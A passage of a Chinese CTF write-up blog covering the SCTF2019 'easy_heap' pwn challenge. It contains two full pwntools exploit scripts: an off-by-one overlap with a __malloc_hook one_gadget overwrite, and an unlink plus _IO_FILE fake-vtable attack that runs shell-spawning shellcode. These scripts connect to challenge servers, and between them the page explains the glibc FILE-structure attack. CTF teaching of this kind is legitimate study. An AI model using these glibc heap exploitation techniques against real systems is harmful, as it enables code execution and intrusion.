class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span><span class="params">(p,index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Mmap: 0x'</span>)</span><br><span class="line">    map_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">'map addr =&gt; '</span> + hex(map_addr))</span><br><span class="line">    code_base = Alloc(p,<span class="number">0x88</span>) - <span class="number">0x202068</span> <span class="comment">#0</span></span><br><span class="line">    chunk_arr = code_base + <span class="number">0x202060</span></span><br><span class="line">    log.success(<span class="string">'program loading base =&gt; '</span> + hex(code_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(p,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(p,<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">2</span>)</span><br><span class="line">    Delete(p,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Alloc(p,<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#overwrite the size to 0x70</span></span><br><span class="line">    Alloc(p,<span class="number">0x58</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(p,<span class="number">0x98</span>)<span class="comment">#1</span></span><br><span class="line">    Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25\n'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#4 stdout</span></span><br><span class="line">    Fill(p,<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">51</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">    p.recvn(<span class="number">0x40</span>)</span><br><span class="line">    libc_bse = u64(p.recv(<span class="number">8</span>)) - <span class="number">3954176</span></span><br><span class="line">    log.success(<span class="string">'lib base =&gt; '</span> + hex(libc_bse))</span><br><span class="line">    malloc_hook = libc_bse + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">35</span></span><br><span class="line">    shell_addr = libc_bse+gadgets[<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    Delete(p,<span class="number">2</span>)<span class="comment">#into 0x70 fast bins</span></span><br><span class="line">    Delete(p,<span class="number">1</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x70</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Fill(p,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x90</span>)+p64(<span class="number">0x71</span>)+p64(fake_chunk)*<span class="number">2</span>+<span class="string">'\n'</span>)</span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(p,<span class="number">0x60</span>)<span class="comment">#5</span></span><br><span class="line">    Fill(p,<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(shell_addr)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#trigger</span></span><br><span class="line">    <span class="comment">#Delete(p,0)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Delete(p,<span class="number">2</span>)</span><br><span class="line">    Delete(p,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./easy_heap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'47.104.89.129'</span>,<span class="number">10004</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">exp(p)</span><br></pre></td></tr></table></figure>
+<h2 id="解法3-官方-x3h1n"><a href="#解法3-官方-x3h1n" class="headerlink" title="解法3(官方+x3h1n)"></a>解法3(官方+x3h1n)</h2><p>这个解法感觉是一个很好玩的套路，今天查了一天资料总算了解差不多了。emm但是感觉要写的东西太多，还是直接copy师姐的exp和分析(懒)</p>
+<p>这个解法利用的IO_FILE攻击，之前我也做过一道题，写了点东西，但是那个只是写了利用的payload，对于具体利用的方式不甚了解，这里会详细一点。</p>
+<h3 id="关于各种结构体及名词"><a href="#关于各种结构体及名词" class="headerlink" title="关于各种结构体及名词"></a>关于各种结构体及名词</h3><p>_IO_FILE_plus是最全面的一个结构体，它包括一个_IO_FILE结构体和一个IO_jump_t指针，同时，我们一会要用的_IO_list_all是它的结构体指针。尤其要注意的是，_IO_list_all 并不是一个描述文件的结构，而是它指向了一个可以描述文件的结构体头部，通常它指向 IO_2_1_stderr 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure>
+<p>_IO_FILE结构体就是我们常常利用的_IO_2_1_stdout_的数据类型，我们可以在Pwngdb中看到一个通常的结构体内容。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>如下图，_chain表示的是链表的下一个节点，紧跟在_IO_FILE后面有一个vtable，即我们所说的虚表，对应_IO_jump_t指针。<br><img src="/2020/09/03/SCTF2019/easy_heap/3.jpg" alt="_IO_FILE"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>这里在gdb去看一下，可以看到vtable里是一堆函数指针</p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/4.jpg" alt="vtable"></p>
+<p>最终拿一张图总结一下(from 安全客)</p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/2.png" alt="io"></p>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>首先利用堆溢出或者任意写将unsorted bin的bk修改_IO_list_all-0x10，根据unsorted bin攻击的原理，(_IO_list_all-0x10)-&gt;fd = unsorted_chunks(av)，结果是_IO_list_all的值被改成了main_arena+88，即main_arena+88被作为一个_IO_FILE结构体对待，注意_chain这里，指向的为smallbin[4]即0x60的第一个块。</p>
+<p>为此，我们需要在smallbin[4]中构造一个假的_IO_FILE。这里用到的知识是当分配一个较小的size的chunk的时候，不符合unsorted bin的size会被放入到small bin中。我们先利用unlink把unsorted bin的size部分改为0x61，最后再分配一个0x1的chunk就可让这个chunk进入smallbin[4]<br>因为这个smallbin要作为我们的fake _IO_FILE，我们用unlink修改其vtable为0x555555756070，而这里存储的是mmap的地址，最终我们申请chunk触发unsorted bin attck，程序报错触发_IO_flush_all_lockp，从而执行mmap里的shellcode。</p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/6.jpg" alt="main_arena"></p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/7.jpg" alt="_chain"></p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/8.jpg" alt="smallbin"></p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/9.jpg" alt="vtable"></p>
+<p>整个的流程可以用下面的图概括</p>
+<p><img src="/2020/09/03/SCTF2019/easy_heap/5.png" alt="attack"></p>
+<h3 id="x3h1n-py"><a href="#x3h1n-py" class="headerlink" title="x3h1n.py"></a>x3h1n.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">   libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">"132.232.100.67"</span>,<span class="number">10004</span>)</span><br><span class="line">   libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(<span class="string">"Address "</span>)</span><br><span class="line">   heap_ptr = int(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">   <span class="keyword">print</span> hex(heap_ptr)</span><br><span class="line">   <span class="keyword">return</span> heap_ptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        mov rax,SYS_open</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        call here</span></span><br><span class="line"><span class="string">        .string "./flag"</span></span><br><span class="line"><span class="string">        here:</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string">        mov rax,SYS_read</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,1</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string">        mov rax,SYS_write</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rax,SYS_exit</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">mmap_addr = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unlink</span></span><br><span class="line">heap_list = add(<span class="number">0xf8</span>) - <span class="number">0x8</span> <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf0</span>)</span><br><span class="line">payload += p64(heap_list+<span class="number">0x8</span><span class="number">-0x18</span>) + p64(heap_list+<span class="number">0x8</span><span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##mmap_addr-&gt;shellcode</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x1000</span>) + p64(mmap_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,shellcode+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unsorted bin size: 0x1c1-&gt;0x61</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">8</span>) + <span class="string">'\x48'</span> + <span class="string">'\n'</span> <span class="comment">#unsortedbin size</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x61\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unsortedbin attack</span></span><br><span class="line"><span class="comment">##bk -&gt; IO_list_all-0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">8</span>) + <span class="string">'\x58'</span> + <span class="string">'\n'</span> <span class="comment">#unsortedbin bk</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x10\x25'</span>+<span class="string">'\n'</span>) <span class="comment">#IO_list_all</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##fake vtable</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x1000</span>) + <span class="string">'\x60'</span> + <span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_vtable = (heap_list - <span class="number">0x202060</span>) + <span class="number">0x202070</span></span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0xb8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(fake_vtable)</span><br><span class="line">edit(<span class="number">3</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(mmap_addr) * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.xctf.org.cn/media/writeup/SCTF-Write-Up/site/sctf-wp/" target="_blank" rel="noopener">SCTF官方writeup</a></p>
+<p><a href="https://www.anquanke.com/post/id/168802#h3-3" target="_blank" rel="noopener">安全客</a></p>
+<p><a href="https://x3h1n.github.io/2019/06/24/SCTF2019-pwn/#more" target="_blank" rel="noopener">x3h1n</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/09/03/HouseOfOrange/house_of_orange/" rel="next" title="house of orange">
+                <i class="fa fa-chevron-left"></i> house of orange
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/09/03/SCTF2019/one_heap/" rel="prev" title="one_heap">
